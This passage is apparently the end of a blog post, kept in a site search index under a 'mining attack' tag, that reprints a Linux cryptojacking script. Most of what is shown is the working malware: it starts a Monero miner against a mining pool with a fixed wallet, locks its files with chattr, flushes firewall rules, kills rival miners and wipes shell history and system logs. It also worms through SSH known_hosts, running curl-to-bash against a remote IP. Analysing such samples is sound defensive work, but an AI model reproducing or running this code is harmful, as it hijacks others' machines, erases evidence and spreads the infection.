class="variable">$cpunum</span>&quot;</span>&lt;=16)); <span class="keyword">then</span></span><br><span class="line">      cpunum=8</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=32)); <span class="keyword">then</span></span><br><span class="line">      cpunum=16</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=32</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&gt;64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=50</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">      <span class="built_in">echo</span> other   </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">                ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=<span class="variable">$cpunum</span> -u 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.3910 -p x &amp;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;tmp runing.....&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    chmod 777 /tmp/zzh</span><br><span class="line">    chattr +i /tmp/zzh</span><br><span class="line">    chmod 777 /tmp/newinit.sh</span><br><span class="line">    chattr +i /tmp/newinit.sh</span><br><span class="line">        </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 5555 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 7777 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 9999 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 9999 -j DROP</span><br><span class="line">service iptables reload</span><br><span class="line">ps auxf|grep -v grep|grep -v 43Xbgtym2GZWBk87XiYbCpTKGPBTxY|grep <span class="string">&quot;stratum&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line"><span class="built_in">history</span> -c</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/spool/mail/root</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /root/.bash_history</span><br><span class="line"></span><br><span class="line">yum install -y bash 2&gt;/dev/null</span><br><span class="line">apt install -y bash 2&gt;/dev/null</span><br><span class="line">apt-get install -y bash 2&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no <span class="variable">$h</span> <span class="string">&#x27;curl -o-  http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no <span class="variable">$h</span> <span class="string">&#x27;cd1 -o-  http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$bbdir</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$bbdira</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bbdir</span> -fsSL http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash</span><br><span class="line"><span class="variable">$bbdira</span> -fsSL http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>挖矿攻击</tag>
      </tags>
  </entry>
</search>
